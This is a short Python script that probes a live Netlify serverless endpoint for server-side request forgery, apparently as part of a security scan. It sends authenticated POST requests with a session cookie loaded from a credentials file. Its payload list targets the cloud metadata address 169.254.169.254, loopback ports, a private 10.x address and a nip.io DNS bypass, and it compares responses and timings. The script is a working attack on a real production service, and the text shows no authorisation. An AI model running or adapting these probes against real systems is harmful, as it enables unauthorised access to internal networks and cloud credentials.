# -*- coding: utf-8 -*-
"""fetch-extension-host-site-sdk-version SSRF 存在性探测
后端 POST {siteUrl} 后去 fetch siteUrl 的 manifest——传内网/元数据/公网 URL 看差异"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A

ctx = ssl.create_default_context()
P = '/.netlify/functions/fetch-extension-host-site-sdk-version'


def post(site_url):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=35)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json',
         'Cookie': COOKIE_A}
    t0 = time.time()
    conn.request('POST', P, body=json.dumps({'siteUrl': site_url}).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:400].decode('utf-8', 'ignore')
    dt = time.time() - t0
    conn.close()
    return st, dt, out


cases = [
    ('baseline https app.netlify.com', 'https://app.netlify.com'),
    ('httpbin /anything',              'https://httpbin.org/anything'),
    ('meta 169.254.169.254',           'http://169.254.169.254/latest/meta-data/'),
    ('loopback 127.0.0.1:80',          'http://127.0.0.1/'),
    ('loopback 127.0.0.1:8080',        'http://127.0.0.1:8080/'),
    ('corp dns name',                  'http://169.254.169.254.nip.io/latest/meta-data/'),
    ('not-a-host',                     'http://definitely-not-a-real-host-zzz.invalid/'),
    ('internal 10.0.0.1',              'http://10.0.0.1/'),
]
for label, u in cases:
    try:
        st, dt, out = post(u)
        print('%-28s [%d] %5.1fs %s' % (label, st, dt, out[:180]))
    except Exception as e:
        print('%-28s ERR %s' % (label, str(e)[:80]))
